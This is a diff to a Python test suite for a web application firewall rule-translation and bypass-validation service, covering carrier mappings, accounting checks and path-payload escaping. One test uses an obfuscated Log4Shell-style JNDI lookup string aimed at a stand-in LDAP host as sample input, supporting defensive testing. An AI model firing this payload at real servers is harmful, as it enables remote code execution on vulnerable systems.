@@ -18,6 +18,7 @@ from pydantic import TypeAdapter, ValidationError
 
 from control_translation import api as api_module
 from control_translation import capability
+from control_translation.adapters.akamai_waf import AkamaiWafAdapter
 from control_translation.config import Settings, get_settings
 from control_translation.contracts import (
     ControlTranslationResult,
@@ -39,12 +40,17 @@ from control_translation.shared_contracts_v2 import (
     SharedContractV2Error,
     _bv_profile,
     _component_condition,
+    _escape_path_payload,
     _expected_bv_dimensions,
+    _expected_template_resolution,
     _resolved_route_conditions,
     _shared_terminal_state_from_cg,
     _translate_carrier_document,
+    _translate_rule_document,
+    _v3_challenge_attribution,
     _validate_cg,
     _validate_mc,
+    _validate_v3_challenge_target,
     build_waf_translation_plan,
     canonical_bytes,
     digest,
@@ -349,9 +355,14 @@ def _chain(*, current_profiles: bool = False) -> tuple[SharedContractV2InvokeReq
                 )
                 continue
             attempt_id = f"bv-attempt:{campaign['obligation_id']}:{index}"
+            wire_digest = "sha256:" + sha256(attempt_id.encode()).hexdigest()
             dimensions.append(
                 {
                     **expected,
+                    "wire_value_sha256": wire_digest,
+                    "wire_value_size_bytes": len(attempt_id),
+                    "baseline_value_sha256": wire_digest,
+                    "wire_encoding_chain": [],
                     "supported": True,
                     "attempt_id": attempt_id,
                     "disposition": "blocked",
@@ -369,6 +380,20 @@ def _chain(*, current_profiles: bool = False) -> tuple[SharedContractV2InvokeReq
         )
     candidate = bundle["primary_candidate"]
     bv_result_id = "bypass-validation-result:shared-42"
+    bv_accounting = _load("bypass-validation-expanded-work-accounting.json")
+    planned_dimensions = sum(
+        len(campaign["attempted_dimensions"]) for campaign in campaigns
+    )
+    disposed_dimensions = sum(
+        len(campaign["attempt_refs"])
+        + sum(not item.get("supported", True) for item in campaign["attempted_dimensions"])
+        for campaign in campaigns
+    )
+    bv_accounting.update(
+        required_work_item_count=planned_dimensions,
+        disposed_work_item_count=disposed_dimensions,
+        unaccounted_required_work_item_count=planned_dimensions - disposed_dimensions,
+    )
     bv_document = {
         "contract_id": "bypass-validation@2.0",
         "profile_id": "waf-bypass@3" if current_profiles else "waf-bypass@2",
@@ -417,7 +442,7 @@ def _chain(*, current_profiles: bool = False) -> tuple[SharedContractV2InvokeReq
         "campaign_results": campaigns,
         "counterexamples": [],
         "feedback": [],
-        "accounting": bv_seed["accounting"],
+        "accounting": bv_accounting,
         "limitations": [],
         "prose_summary": "Every required obligation campaign completed without an attributable bypass.",
         "produced_at": CREATED_AT,
@@ -546,6 +571,27 @@ def _resign_record(
     return SharedContractV2InvokeRequest.model_validate(body)
 
 
+def _sync_bv_dimension_accounting(records: dict[str, UpstreamRecord]) -> None:
+    bv = records["bypass-validation"].result
+    dimensions = [
+        dimension
+        for campaign in bv["campaign_results"]
+        for dimension in campaign["attempted_dimensions"]
+    ]
+    executed = sum(len(campaign["attempt_refs"]) for campaign in bv["campaign_results"])
+    disposed = executed + sum(dimension["supported"] is False for dimension in dimensions)
+    bv["search_bounds"]["variant_families_attempted"] = sorted(
+        {dimension["transformation"] for dimension in dimensions}
+    )
+    bv["search_bounds"]["attempt_budget"] = len(dimensions)
+    bv["search_bounds"]["attempts_executed"] = executed
+    bv["accounting"]["required_work_item_count"] = len(dimensions)
+    bv["accounting"]["disposed_work_item_count"] = disposed
+    bv["accounting"]["unaccounted_required_work_item_count"] = (
+        len(dimensions) - disposed
+    )
+
+
 class FakeResolver:
     def __init__(self, records: dict[str, UpstreamRecord]) -> None:
         self.records = records
@@ -655,7 +701,46 @@ def test_valid_four_result_join_is_complete_and_deterministic() -> None:
     assert first.verification == second.verification
     assert first.verification.required_obligation_count == 6
     assert first.accounting.unaccounted_required_obligation_count == 0
+    assert first.accounting.model_dump(mode="json") == _load(
+        "bypass-validation-expanded-work-accounting.json"
+    )
+    assert (
+        first.accounting.required_work_item_count
+        > first.accounting.required_obligation_count
+    )
     assert set(first.artifact_contents) == {"artifact-main", "artifact-carriers"}
+
+
+@pytest.mark.parametrize(
+    ("field", "value"),
+    [
+        ("required_work_item_count", 20),
+        ("disposed_work_item_count", 18),
+    ],
+)
+def test_join_rejects_bv_campaign_accounting_contradiction(
+    field: str, value: int
+) -> None:
+    request, records = _chain()
+    records["bypass-validation"].result["accounting"][field] = value
+    request = _resign_record(request, records, "bypass-validation")
+
+    with pytest.raises(SharedContractV2Error) as raised:
+        verify_four_result_join(records, _locators(request))
+    assert raised.value.code == "bv-accounting-invalid"
+
+
+def test_join_rejects_globally_duplicated_bv_attempt_id() -> None:
+    request, records = _chain()
+    campaigns = records["bypass-validation"].result["campaign_results"]
+    duplicate_id = campaigns[0]["attempt_refs"][0]
+    campaigns[1]["attempted_dimensions"][0]["attempt_id"] = duplicate_id
+    campaigns[1]["attempt_refs"][0] = duplicate_id
+    request = _resign_record(request, records, "bypass-validation")
+
+    with pytest.raises(SharedContractV2Error) as raised:
+        verify_four_result_join(records, _locators(request))
+    assert raised.value.code == "bv-attempt-accounting-invalid"
 
 
 def test_current_four_result_join_requires_exact_profile_revisions() -> None:
@@ -683,6 +768,174 @@ def test_current_bv_optional_dimension_fields_accept_serialized_nulls() -> None:
     assert verified.verification.all_required_obligations_have_required_bv_disposition
 
 
+def test_current_bv_accepts_real_regex_challenge_dimension() -> None:
+    request, records = _chain(current_profiles=True)
+    campaign = next(
+        campaign
+        for campaign in records["bypass-validation"].result["campaign_results"]
+        if any(
+            dimension["component_id"] == "component-url"
+            for dimension in campaign["attempted_dimensions"]
+        )
+    )
+    baseline = next(
+        dimension
+        for dimension in campaign["attempted_dimensions"]
+        if dimension["component_id"] == "component-url"
+    )
+    challenge = {
+        **baseline,
+        "transformation": (
+            "challenge:regex-independent-witness:slot-resource:0|"
+            "component:component-url|carrier:query|transformation:"
+            + baseline["transformation"].split("|", 1)[-1]
+        ),
+        "attempt_id": "bv-attempt:regex-independent-witness",
+    }
+    campaign["attempted_dimensions"].append(challenge)
+    campaign["attempt_refs"].append(challenge["attempt_id"])
+    _sync_bv_dimension_accounting(records)
+    request = _resign_record(request, records, "bypass-validation")
+
+    verified = resolve_and_verify_four_result_join(request, FakeResolver(records))
+
+    assert verified.accounting.required_work_item_count == 28
+
+
+def test_current_bv_accepts_deduplicated_multi_attribution_label() -> None:
+    request, records = _chain(current_profiles=True)
+    dimension = next(
+        dimension
+        for campaign in records["bypass-validation"].result["campaign_results"]
+        for dimension in campaign["attempted_dimensions"]
+        if dimension["component_id"] == "component-url"
+    )
+    producer_label = dimension["transformation"]
+    dimension["transformation"] = (
+        producer_label
+        + "||attribution:challenge:regex-independent-witness:slot-resource:0|"
+        "component:component-url|carrier:query|transformation:"
+        + producer_label.split("|", 1)[-1]
+    )
+    _sync_bv_dimension_accounting(records)
+    request = _resign_record(request, records, "bypass-validation")
+
+    verified = resolve_and_verify_four_result_join(request, FakeResolver(records))
+
+    assert verified.verification.all_required_obligations_have_required_bv_disposition
+
+
+def test_current_bv_accepts_authenticated_governed_family_labels() -> None:
+    request, records = _chain(current_profiles=True)
+    bv = records["bypass-validation"].result
+    for campaign in bv["campaign_results"]:
+        for dimension in campaign["attempted_dimensions"]:
+            dimension["family"] = "baseline"
+    bounds = bv["search_bounds"]
+    enabled = ["baseline", "case-normalization", "encoding", "semantic-domain"]
+    bounds.update(
+        {
+            "variant_families_requested": enabled,
+            "variant_families_enabled": enabled,
+            "variant_families_attempted": ["baseline"],
+            "variant_families_planned": ["baseline"],
+            "variant_families_generated": ["baseline"],
+            "variant_families_executed": ["baseline"],
+            "variant_families_budget_skipped": [],
+            "variant_families_unsupported": [],
+            "variant_families_out_of_scope": [
+                "case-normalization",
+                "encoding",
+                "semantic-domain",
+            ],
+        }
+    )
+    request = _resign_record(request, records, "bypass-validation")
+
+    verified = resolve_and_verify_four_result_join(request, FakeResolver(records))
+
+    assert verified.verification.all_required_obligations_have_required_bv_disposition
+
+
+def test_current_bv_accepts_unsupported_approved_challenge() -> None:
+    request, records = _chain(current_profiles=True)
+    campaign = next(
+        campaign
+        for campaign in records["bypass-validation"].result["campaign_results"]
+        if any(
+            dimension["component_id"] == "component-query"
+            for dimension in campaign["attempted_dimensions"]
+        )
+    )
+    baseline = next(
+        dimension
+        for dimension in campaign["attempted_dimensions"]
+        if dimension["component_id"] == "component-query"
+    )
+    campaign["attempted_dimensions"].append(
+        {
+            "carrier": baseline["carrier"],
+            "transformation": (
+                "challenge:percent-representation:slot-probe|"
+                "component:component-query|carrier:query|transformation:unsupported"
+            ),
+            "input_id": baseline["input_id"],
+            "component_id": baseline["component_id"],
+            "supported": False,
+            "detail": "authenticated source decoder chain is unavailable",
+        }
+    )
+    _sync_bv_dimension_accounting(records)
+    request = _resign_record(request, records, "bypass-validation")
+
+    verified = resolve_and_verify_four_result_join(request, FakeResolver(records))
+
+    assert verified.accounting.required_work_item_count == 28
+    assert verified.accounting.disposed_work_item_count == 28
+
+
+@pytest.mark.parametrize(
+    "challenge_label",
+    [
+        "challenge:not-profile-approved:slot-resource:0|component:component-url|carrier:query|transformation:bv:query:0:decode",
+        "challenge:regex-independent-witness:slot-resource:0|component:component-query|carrier:query|transformation:bv:query:0:decode",
+        "challenge:regex-independent-witness:slot-resource:2|component:component-url|carrier:query|transformation:bv:query:0:decode",
+    ],
+)
+def test_current_bv_rejects_bogus_challenge_attribution(
+    challenge_label: str,
+) -> None:
+    request, records = _chain(current_profiles=True)
+    dimension = next(
+        dimension
+        for campaign in records["bypass-validation"].result["campaign_results"]
+        for dimension in campaign["attempted_dimensions"]
+        if dimension["component_id"] == "component-url"
+    )
+    dimension["transformation"] += "||attribution:" + challenge_label
+    _sync_bv_dimension_accounting(records)
+    request = _resign_record(request, records, "bypass-validation")
+
+    with pytest.raises(SharedContractV2Error) as raised:
+        resolve_and_verify_four_result_join(request, FakeResolver(records))
+
+    assert raised.value.code == "bv-dimension-invalid"
+
+
+def test_current_bv_rejects_missing_required_producer_dimension() -> None:
+    request, records = _chain(current_profiles=True)
+    campaign = records["bypass-validation"].result["campaign_results"][0]
+    removed = campaign["attempted_dimensions"].pop()
+    campaign["attempt_refs"].remove(removed["attempt_id"])
+    _sync_bv_dimension_accounting(records)
+    request = _resign_record(request, records, "bypass-validation")
+
+    with pytest.raises(SharedContractV2Error) as raised:
+        resolve_and_verify_four_result_join(request, FakeResolver(records))
+
+    assert raised.value.code == "bv-dimension-invalid"
+
+
 def test_raw_body_artifacts_translate_without_synthetic_selector() -> None:
     artifact_id = "artifact:raw-body"
     condition, rule_key = _component_condition(
@@ -695,6 +948,7 @@ def test_raw_body_artifacts_translate_without_synthetic_selector() -> None:
             "flags": [],
             "transformations": [],
         },
+        component={"location": {"family": "http", "kind": "http-body-raw"}},
         source_artifact_id=artifact_id,
         seen_rule_ids=set(),
     )
@@ -716,6 +970,251 @@ def test_raw_body_artifacts_translate_without_synthetic_selector() -> None:
     assert condition["type"] == "argsPostMatch"
     assert "parameter" not in condition
     assert bindings["carrierBindings"][0]["selector"] == ""
+
+
+@pytest.mark.parametrize(
+    ("location", "carrier", "name", "condition_type", "absent_selector"),
+    [
+        ({"family": "http", "kind": "http-query", "name": "*"}, "query", "*", "uriQueryMatch", "parameter"),
+        ({"family": "http", "kind": "http-header", "name": "*"}, "header", "*", "requestHeaderMatch", "header"),
+        ({"family": "http", "kind": "http-cookie", "name": "*"}, "cookie", "*", "cookieMatch", "cookieName"),
+        ({"family": "http", "kind": "http-body-structured", "selector_type": "any-field"}, "body", "*", "argsPostJSONMatch", "parameter"),
+        ({"family": "http", "kind": "http-body-raw"}, "body", "", "argsPostMatch", "parameter"),
+    ],
+)
+def test_expanded_carriers_preserve_whole_collection_semantics(
+    location: dict[str, Any],
+    carrier: str,
+    name: str,
+    condition_type: str,
+    absent_selector: str,
+) -> None:
+    condition, key = _component_condition(
+        {
+            "rule_id": "rule:expanded",
+            "carrier": carrier,
+            "name": name,
+            "component_id": "component:expanded",
+            "pattern": "^attack$",
+            "flags": [],
+            "transformations": [],
+        },
+        component={"location": location},
+        source_artifact_id="artifact:expanded",
+        seen_rule_ids=set(),
+    )
+
+    assert key == (carrier, name, "component:expanded")
+    assert condition["type"] == condition_type
+    assert absent_selector not in condition
+    assert condition["sourceLocationKind"] == location["kind"]
+
+
+def test_structured_named_body_preserves_parameter_selector() -> None:
+    condition, _ = _component_condition(
+        {
+            "rule_id": "rule:json-pointer",
+            "carrier": "body",
+            "name": "/nested/probe",
+            "component_id": "component:json-pointer",
+            "pattern": "^attack$",
+            "flags": [],
+            "transformations": [],
+        },
+        component={
+            "location": {
+                "family": "http",
+                "kind": "http-body-structured",
+                "selector_type": "json-pointer",
+                "selector": "/nested/probe",
+            }
+        },
+        source_artifact_id="artifact:json-pointer",
+        seen_rule_ids=set(),
+    )
+
+    assert condition["type"] == "argsPostJSONMatch"
+    assert condition["parameter"] == "/nested/probe"
+    assert condition["sourceSelectorType"] == "json-pointer"
+
+
+@pytest.mark.parametrize(
+    ("location", "expected_carrier"),
+    [
+        ({"family": "http", "kind": "http-query", "name": "*"}, "query"),
+        ({"family": "http", "kind": "http-header", "name": "*"}, "header"),
+        ({"family": "http", "kind": "http-cookie", "name": "*"}, "cookie"),
+        ({"family": "http", "kind": "http-body-structured", "selector_type": "any-field"}, "body-json"),
+        ({"family": "http", "kind": "http-body-raw"}, "body-raw"),
+        ({"family": "http", "kind": "http-path"}, "path"),
+    ],
+)
+def test_expanded_carrier_dimensions_remain_complete_and_independent(
+    location: dict[str, Any], expected_carrier: str
+) -> None:
+    component_id = "component:expanded"
+    input_id = "input:expanded"
+    scope = "semantics:expanded"
+    semantics = {
+        "components": [
+            {
+                "component_id": component_id,
+                "location": location,
+                "input_refs": [
+                    {"kind": "test-input", "scope": scope, "id": input_id}
+                ],
+                "transformations": [],
+            }
+        ],
+        "coverage": {"groups": []},
+    }
+    obligation = {
+        "coverage_ref": {"kind": "component", "scope": scope, "id": component_id},
+        "required_input_refs": [
+            {"kind": "test-input", "scope": scope, "id": input_id}
+        ],
+    }
+
+    dimensions = _expected_bv_dimensions(
+        obligation, semantics, profile_id="waf-bypass@3"
+    )
+
+    assert dimensions
+    assert {
+        (item["input_id"], item["component_id"], item["carrier"])
+        for item in dimensions
+    } == {(input_id, component_id, expected_carrier)}
+    assert len(dimensions) == len(
+        {
+            (
+                item["input_id"],
+                item["component_id"],
+                item["carrier"],
+                item["transformation"],
+            )
+            for item in dimensions
+        }
+    )
+
+
+def test_path_payloads_expand_to_distinct_route_bound_or_alternatives() -> None:
+    scope = "semantics:expanded"
+    refs = [
+        {"kind": "test-input", "scope": scope, "id": "input:path:a"},
+        {"kind": "test-input", "scope": scope, "id": "input:path:b"},
+    ]
+    semantics = {
+        "components": [
+            {
+                "component_id": "component:path",
+                "location": {"family": "http", "kind": "http-path"},
+                "input_refs": refs,
+            },
+            {
+                "component_id": "component:query",
+                "location": {"family": "http", "kind": "http-query", "name": "*"},
+                "input_refs": refs,
+            },
+        ],
+        "test_inputs": [
+            {
+                "input_id": input_id,
+                "input": {
+                    "modality": "http-request-template",
+                    "method": "POST",
+                    "path_key": "public/submit.php",
+                    "path_payload": payload,
+                },
+            }
+            for input_id, payload in (("input:path:a", "a/b"), ("input:path:b", "second value"))
+        ],
+    }
+    document = {
+        "rule_set_id": "rules:expanded",
+        "action": "block",
+        "placement_mode": "route-bound-v1",
+        "coverage_alternatives": [["component:path", "component:query"]],
+        "route_bound_alternatives": [
+            {
+                "alternative_id": "alternative:expanded",
+                "component_ids": ["component:path", "component:query"],
+                "component_bindings": [
+                    {"component_id": "component:path", "input_refs": refs},
+                    {"component_id": "component:query", "input_refs": refs},
+                ],
+                "route": {
+                    "kind": "opaque-path-key",
+                    "method": "POST",
+                    "path_key": "public/submit.php",
+                },
+            }
+        ],
+        "rules": [
+            {
+                "rule_id": "rule:path",
+                "component_id": "component:path",
+                "carrier": "path",
+                "name": "",
+                "pattern": "^(?:a/b|second value)$",
+                "flags": [],
+                "transformations": [],
+            },
+            {
+                "rule_id": "rule:query",
+                "component_id": "component:query",
+                "carrier": "query",
+                "name": "*",
+                "pattern": "^attack$",
+                "flags": [],
+                "transformations": [],
+            },
+        ],
+    }
+
+    translated, carrier_keys = _translate_rule_document(
+        document,
+        source_artifact_id="artifact:expanded",
+        semantics=semantics,
+        profile_id="waf-standard@2",
+    )
+
+    assert len(translated) == 2
+    assert [item[0] for item in translated] == [
+        "alternative:expanded:path-payload:0",
+        "alternative:expanded:path-payload:1",
+    ]
+    assert [item[1]["conditions"][0]["value"] for item in translated] == [
+        ["/public/submit.php/a%2Fb"],
+        ["/public/submit.php/second%20value"],
+    ]
+    assert all(item[1]["operation"] == "AND" for item in translated)
+    assert all(item[1]["conditions"][2]["sourceSelector"] == "*" for item in translated)
+    assert all("parameter" not in item[1]["conditions"][2] for item in translated)
+    assert carrier_keys == [
+        ("path", "", "component:path"),
+        ("query", "*", "component:query"),
+    ]
+
+    endpoint_independent = deepcopy(document)
+    endpoint_independent.pop("placement_mode")
+    endpoint_independent.pop("route_bound_alternatives")
+    generalized, generalized_keys = _translate_rule_document(
+        endpoint_independent,
+        source_artifact_id="artifact:expanded",
+        semantics=semantics,
+        profile_id="waf-standard@2",
+    )
+    assert generalized_keys == carrier_keys
+    assert len(generalized) == 1
+    conditions = generalized[0][1]["conditions"]
+    assert [condition["type"] for condition in conditions] == [
+        "pathMatch",
+        "uriQueryMatch",
+    ]
+    assert conditions[0]["value"] == ["^(?:a/b|second value)$"]
+    assert all("sourceRoute" not in condition for condition in conditions)
+    assert all("sourcePathComponents" not in condition for condition in conditions)
+    assert generalized[0][1]["operation"] == "AND"
 
 
 def test_opaque_route_key_resolves_without_becoming_a_literal_path() -> None:
@@ -812,6 +1311,238 @@ def test_mc_d78824c_template_resolution_and_case_evidence_are_verified() -> None
             _locators(request),
         )
     assert raised.value.code == "mc-template-resolution-invalid"
+
+
+def test_mc_path_template_resolution_appends_the_encoded_semantic_payload() -> None:
+    item = {
+        "input_id": "input:path",
+        "input": {
+            "modality": "http-request-template",
+            "method": "GET",
+            "path_key": "inventory-item-detail",
+            "path_payload": r"\x24\x7battack\x7d",
+            "query": [],
+            "headers": [],
+            "cookies": [],
+            "body": {"state": "absent"},
+        },
+    }
+
+    resolution = _expected_template_resolution(
+        item,
+        resolver_id="mc-approved-route-adapter",
+        profile_id="waf-standard@2",
+        profile_digest="sha256:" + "a" * 64,
+        route={
+            "scheme": "https",
+            "authority": "approved-mc-target.internal",
+            "path": "/inventory/items/42",
+        },
+    )
+
+    assert resolution["rendered_request"]["path"] == (
+        "/inventory/items/42/%5Cx24%5Cx7battack%5Cx7d"
+    )
+    assert "path_payload" not in resolution["rendered_request"]
+
+    item["input"]["path_payload"] = "${${::-j}${::-n}${::-d}${::-i}:ldap://foo/bar}"
+    resolution = _expected_template_resolution(
+        item,
+        resolver_id="mc-approved-route-adapter",
+        profile_id="waf-standard@2",
+        profile_digest="sha256:" + "a" * 64,
+        route={
+            "scheme": "https",
+            "authority": "approved-mc-target.internal",
+            "path": "/inventory/items/42",
+        },
+    )
+    assert resolution["rendered_request"]["path"] == (
+        "/inventory/items/42/$%7B$%7B::-j%7D$%7B::-n%7D$%7B::-d%7D"
+        "$%7B::-i%7D:ldap:%2F%2Ffoo%2Fbar%7D"
+    )
+
+
+def test_mc_template_resolution_preserves_encoded_path_payload() -> None:
+    fixture_path = FIXTURES / "workflow-lab-mc-path-payload-resolution.json"
+    raw = fixture_path.read_bytes()
+    expected_digest = fixture_path.with_suffix(".json.sha256").read_text().split()[0]
+    assert sha256(raw).hexdigest() == expected_digest
+    fixture = json.loads(raw)
+
+    resolution = _expected_template_resolution(
+        fixture["item"],
+        resolver_id=fixture["resolver_id"],
+        profile_id=fixture["profile_id"],
+        profile_digest=fixture["profile_digest"],
+        route=fixture["route"],
+    )
+
+    assert resolution == fixture["expected_resolution"]
+    route_conditions = _resolved_route_conditions(
+        {
+            "kind": "opaque-path-key",
+            "method": fixture["item"]["input"]["method"],
+            "path_key": fixture["item"]["input"]["path_key"],
+        },
+        profile_id=fixture["profile_id"],
+        alternative_id="alternative:path-payload",
+        path_payload=fixture["item"]["input"]["path_payload"],
+    )
+    assert route_conditions[0]["value"] == [
+        fixture["expected_resolution"]["rendered_request"]["path"]
+    ]
+
+
+def test_go_compatible_path_payload_escape_boundaries() -> None:
+    assert _escape_path_payload("$&+:-=@/ %2Fé") == (
+        "$&+:-=@%2F%20%252F%C3%A9"
+    )
+
+
+@pytest.mark.parametrize(
+    ("field", "carrier", "location"),
+    [
+        ("target:http-path:path-payload", "path", {"kind": "http-path"}),
+        (
+            "target:http-header:X-Janus-Test:0",
+            "header",
+            {"kind": "http-header", "name": "*"},
+        ),
+        (
+            "target:http-query:janus_test:0",
+            "query",
+            {"kind": "http-query", "name": "*"},
+        ),
+        (
+            "target:http-cookie:janus_test:0",
+            "cookie",
+            {"kind": "http-cookie", "name": "*"},
+        ),
+        (
+            "target:http-body-structured:/janus_test",
+            "body-json",
+            {"kind": "http-body-structured", "selector_type": "any-field"},
+        ),
+    ],
+)
+def test_bv_v3_challenge_targets_preserve_concrete_carrier_attribution(
+    field: str, carrier: str, location: dict[str, str]
+) -> None:
+    _validate_v3_challenge_target(
+        field,
+        actual={"carrier": carrier},
+        component={"location": location},
+    )
+
+
+def test_bv_v3_challenge_target_rejects_unbound_concrete_carrier() -> None:
+    with pytest.raises(SharedContractV2Error) as raised:
+        _validate_v3_challenge_target(
+            "target:http-header:X-Invented:0",
+            actual={"carrier": "header"},
+            component={"location": {"kind": "http-header", "name": "X-Exact"}},
+        )
+    assert raised.value.code == "bv-dimension-invalid"
+
+
+def test_bv_v3_profile_challenge_accepts_authenticated_source_chain() -> None:
+    producer = {
+        (
+            "challenge:source:authenticated-representation|component:component:test"
+            "|carrier:path|transformation:baseline:authenticated-source"
+        )
+    }
+    _v3_challenge_attribution(
+        "challenge:enum-alternate:slot:test:0|component:component:test"
+        "|carrier:path|transformation:baseline:authenticated-source",
+        actual={"component_id": "component:test", "carrier": "path"},
+        component={
+            "grammar": {
+                "slots": [
+                    {
+                        "slot_id": "slot:test",
+                        "value_type": "scheme",
+                        "allowed_domain": {"kind": "enum", "values": ["ldap"]},
+                    }
+                ]
+            }
+        },
+        producer_attributions=producer,
+        challenges={
+            "enum-alternate": {
+                "carriers": ["path"],
+                "maximum_values": 2,
+                "value_types": ["scheme"],
+                "domain_kinds": ["enum"],
+                "strategy": "domain",
+            }
+        },
+    )
+
+
+def test_structured_any_field_maps_to_wildcard_body_selector() -> None:
+    condition, carrier = _component_condition(
+        {
+            "rule_id": "rule:any-field",
+            "component_id": "component:any-field",
+            "carrier": "body",
+            "name": "*",
+            "pattern": "attack",
+            "flags": [],
+            "transformations": [],
+        },
+        component={
+            "component_id": "component:any-field",
+            "location": {
+                "kind": "http-body-structured",
+                "selector_type": "any-field",
+            },
+        },
+        source_artifact_id="artifact:any-field",
+        seen_rule_ids=set(),
+    )
+
+    assert carrier == ("body", "*", "component:any-field")
+    assert condition["type"] == "argsPostJSONMatch"
+    assert condition["sourceSelector"] == "*"
+
+
+def test_akamai_syntax_accepts_authenticated_any_header_condition() -> None:
+    document = {
+        "rules": [
+            {
+                "name": "wildcard-header",
+                "operation": "AND",
+                "conditions": [
+                    {
+                        "type": "requestHeaderMatch",
+                        "positiveMatch": True,
+                        "value": ["attack"],
+                        "sourceCarrier": "header",
+                        "sourceSelector": "*",
+                    },
+                    {
+                        "type": "argsPostJSONMatch",
+                        "positiveMatch": True,
+                        "value": ["attack"],
+                        "sourceLocationKind": "http-body-structured",
+                        "sourceSelectorType": "any-field",
+                        "sourceSelector": "*",
+                    }
+                ],
+            }
+        ]
+    }
+
+    validation = AkamaiWafAdapter().validate_syntax(json.dumps(document))
+    assert validation.valid is True
+    assert validation.errors == []
+
+    invalid = json.loads(json.dumps(document))
+    invalid["rules"][0]["conditions"][0]["type"] = "requestHeaderValueMatch"
+    invalid_validation = AkamaiWafAdapter().validate_syntax(json.dumps(invalid))
+    assert invalid_validation.valid is False
 
 
 def test_bv_ddb49be_root_dimensions_match_cg_semantics_and_profile() -> None:
@@ -933,6 +1664,16 @@ def test_unmappable_required_artifact_returns_typed_cannot_express_without_parti
     assert result.structured_result.translated_directives == []
     assert result.structured_result.translation_mappings == []
     assert result.inference["llm_invoked"] is False
+    lifecycle = build_lifecycle_result(result, request, get_settings())
+    assert lifecycle["terminal_state"] == "not-translatable"
+    assert lifecycle["outcome_reason"] == {
+        "code": "unsupported-feature",
+        "detail": "required carrier cannot map to the target",
+    }
+    assert lifecycle["primary_candidate"] is None
+    assert lifecycle["artifacts"] == {}
+    assert lifecycle["translated_directives"] == []
+    assert lifecycle["translation_mappings"] == []
 
 
 def test_capability_verification_failure_stops_before_translation_plan(
@@ -1012,6 +1753,24 @@ def test_v2_lifecycle_state_is_compact_and_request_rehydrates(tmp_path) -> None:
     assert "candidate_bundle" not in serialized
     assert "candidate_artifact_contents" not in serialized
     assert len(serialized.encode()) < 16 * 1024
+
+
+def test_production_invoke_rejects_workflow_lab_references_before_resolution() -> None:
+    request, _ = _chain()
+    document = request.model_dump(mode="json", by_alias=True)
+    for item in document["upstream_inputs"]:
+        item["result_ref"] = {
+            "system": "workflow-lab",
+            "contract_id": "workflow-lab-result-reference@1.0",
+            "namespace": "immutable-results",
+            "key": item["result_id"],
+        }
+    replay_request = SharedContractV2InvokeRequest.model_validate(document)
+
+    response = api_module.invoke_endpoint(replay_request)
+
+    assert response.status_code == 422
+    assert b"execution_plane_mismatch" in response.body
 
 
 def test_v2_result_contract_rejects_partial_or_unknown_mapping() -> None:
@@ -1830,7 +2589,9 @@ def test_expected_bv_dimensions_include_complete_grammar_product() -> None:
     )
 
     labels = [item["transformation"] for item in dimensions]
-    assert len(labels) == 2 * len(_bv_profile("waf-bypass@3")["bypass_dimensions"]["header"])
+    assert len(labels) == 2 * (
+        1 + len(_bv_profile("waf-bypass@3")["bypass_dimensions"]["header"])
+    )
     assert any(label.startswith("grammar:sample|") for label in labels)
     assert any(label.startswith("grammar:product:1|") for label in labels)
 
